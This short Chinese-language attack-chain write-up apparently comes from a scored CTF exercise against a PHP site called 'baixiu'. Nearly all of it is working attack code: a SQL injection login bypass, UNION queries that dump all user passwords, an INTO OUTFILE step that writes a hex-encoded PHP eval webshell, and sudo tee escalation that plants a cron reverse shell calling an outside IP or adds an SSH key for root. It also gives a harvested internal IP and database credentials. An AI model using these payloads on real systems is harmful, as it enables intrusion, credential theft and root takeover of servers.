## 攻击链

### 漏洞 ① — 登录框 SQL 注入 (Web管理员 100分)

**位置:** `admin/login.php` 第 43 行

```php
$query = mysqli_query($conn, "select * from users where email = '{$email}' limit 1;");
```

**Payload:**

```
POST /baixiu/admin/login.php

email=' UNION SELECT 1,2,'x',4,5,6-- -
password=x
```

→ 绕过登录，拿后台 session，**Web管理员 100分**

### 漏洞 ② — SQLi 爆数据

```bash
# 爆所有用户密码
email=' UNION SELECT 1,2,group_concat(email,0x3a,password),4,5,6 FROM users-- -&password=2

# 爆数据库路径
email=' UNION SELECT 1,2,@@datadir,4,5,6-- -&password=2
```

### 漏洞 ③ — INTO OUTFILE 写 webshell (普通用户 20分)

```sql
SELECT 0x3C3F706870206576616C28245F504F53545B315D293B3F3E 
INTO OUTFILE '/var/www/html/baixiu/shell.php'
```

→ www-data 权限，**服务器普通用户 20分**

### 漏洞 ④ — sudo tee 提权 (root 100分)

```bash
echo "* * * * * root bash -c 'bash -i >& /dev/tcp/IP/8888 0>&1'" | sudo tee -a /etc/crontab
```

替代方案：

```bash
echo "ssh-rsa AAA..." | sudo tee -a /root/.ssh/authorized_keys
```

→ root 权限，**服务器 root 100分**

### 漏洞 ⑤ — 边界突破素材

```
读 /var/www/html/baixiu/config.php → 
A2 IP: 192.168.100.20
A2 MySQL: yfcmf / YfCmf@Sync#2024
```

### 漏洞 ⑥ — ThinkPHP 5.0 RCE (A2 待部署)

### 漏洞 ⑦ — sudo find 提权 (A2 待部署)
